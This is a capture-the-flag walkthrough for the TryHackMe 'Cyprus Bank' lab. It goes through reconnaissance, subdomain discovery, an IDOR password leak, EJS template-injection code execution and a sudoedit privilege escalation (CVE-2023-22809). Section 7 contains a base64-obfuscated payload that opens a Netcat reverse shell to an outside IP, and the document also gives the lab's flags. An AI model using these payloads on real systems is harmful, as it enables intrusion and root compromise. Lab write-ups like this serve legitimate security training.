# Cyprus Bank — TryHackMe

## 1. Environment Setup

First, we add the target domain to `/etc/hosts`.


```
sudo echo "10.114.163.193 cyprusbank.thm" | sudo tee -a /etc/hosts
```

## 2. Information Gathering

### Nmap

We start by scanning the target to identify open ports and running services.


```
sudo nmap -sC -sS -sV 10.114.163.193
```

Results:

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
```

Two ports are open:

* 22/tcp — SSH

* 80/tcp — HTTP (nginx)

### Nuclei

Next, we use Nuclei to check for known vulnerabilities.


```
nuclei -u 10.114.163.193 -severity low,medium,high,critical
```

Result: CVE-2023-48795 (Terrapin Attack) is detected on port 22.

## 3. Domain Enumeration

### ffuf

We use ffuf to discover directories on the web server.

```
ffuf -u http://10.114.163.193/FUZZ -w ~/HH101/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

### Gobuster

We also run Gobuster to enumerate directories.

```
gobuster dir -u http://10.114.163.193/ -w ~/HH101/seclists/Discovery/Web-Content/big.txt
```

Result: The `/index.html` page is discovered with a `200` status code.

### Subdomain Enumeration

To discover possible subdomains, we use ffuf with a custom `Host` header.

```
ffuf -u 'http://cyprusbank.thm/' -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -t 100 -ic -fw 1
```

Result: We discover the following subdomain:

```
admin.cyprusbank.thm
```

## 4. Accessing the Admin Website

We navigate to the admin website:

[http://admin.cyprusbank.thm](http://admin.cyprusbank.thm) 

We use the credentials provided at the beginning of the room:

* Username: `Olivia Cortez`

* Password: `olivi8`

After logging in, we gain access to the admin panel.

## 5. IDOR — Password Disclosure

In the Messages section, we start enumerating the `c=` parameter.

```
https://admin.cyprusbank.thm/messages/?c=10
```

We discover an IDOR vulnerability that allows us to access other users' conversations.

After reading the message history, we find the following exchange:

```
DEV TEAM: Thanks Gayle, can you share your credentials? We need privileged admin account for testing
Gayle Bev: Of course! My password is 'p~]P@5!6;rs558:q'
```

We have successfully obtained Gayle Bev's password:

```
p~]P@5!6;rs558:q
```

## 6. Finding the Phone Number and Flags

While exploring the database, we discover the following record:

|
Name

|

Balance

|

Phone
|

Tyrell Wellick

|

$20.855.900.000

|

842-029-5701

|

## 7. Obtaining a Shell as `web` (SSTI via EJS)

In the Settings section, we find an option to change a user's password.

When changing the password, we notice that the submitted data is reflected in the response. This leads us to investigate a possible XSS/SSTI vulnerability.

The key request uses the `outputFunctionName` parameter:


```
httpname=a&password=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "echo YnVzeWJveCBuYyAxMC4xNC45MC4yMzUgNDQ0NSAtZSAvYmluL2Jhc2g= | base64 -d | bash"');//
```

We configure a Netcat listener on port `4445` (or any other available port) and send the payload.

After successful exploitation, we receive a reverse shell as the `web` user.

We then upgrade the shell to make it more interactive.

Inside the `web` user's home directory, we find the user flag.

**User flag**

`THM{4lways_upd4te_uR_d3p3nd3nc!3s}`

## 8. Privilege Escalation (sudoedit — CVE-2023-22809)

Now that we have a shell as `web`, we check the available sudo permissions.


```
web@cyprusbank:~$ sudo -l
```

The output shows:

```
BashMatching Defaults entries for web on cyprusbank:
    ...
User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

The `web` user can run `sudoedit` as root without a password, but only for the specified Nginx configuration file.

This is where CVE-2023-22809, a `sudoedit` bypass vulnerability, comes into play.

The vulnerability allows us to abuse the `EDITOR` environment variable to access and edit files outside the permitted path.

We set the editor to open the root flag:


```
export EDITOR="vi -- /root/root.txt"
```

Then we execute `sudoedit` on the permitted file:


```
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

This allows us to access `/root/root.txt` and retrieve the final flag.

**Root flag**

`THM{4nd_uR_p4ck4g3s}`

## 9. Exploitation Chain

1. Add `cyprusbank.thm` to `/etc/hosts`.

2. Scan the target using Nmap.

3. Check for known vulnerabilities using Nuclei.

4. Enumerate directories using ffuf and Gobuster.

5. Discover the `admin.cyprusbank.thm` subdomain.

6. Log in to the admin panel using the provided credentials.

7. Exploit an IDOR vulnerability to read another user's messages.

8. Obtain Gayle Bev's password.

9. Discover the SSTI vulnerability in EJS.

10. Execute a reverse shell and gain access as `web`.

11. Retrieve `user.txt`.

12. Discover the permitted `sudoedit` command.

13. Exploit CVE-2023-22809 to access `/root/root.txt`.

14. Retrieve the root flag.
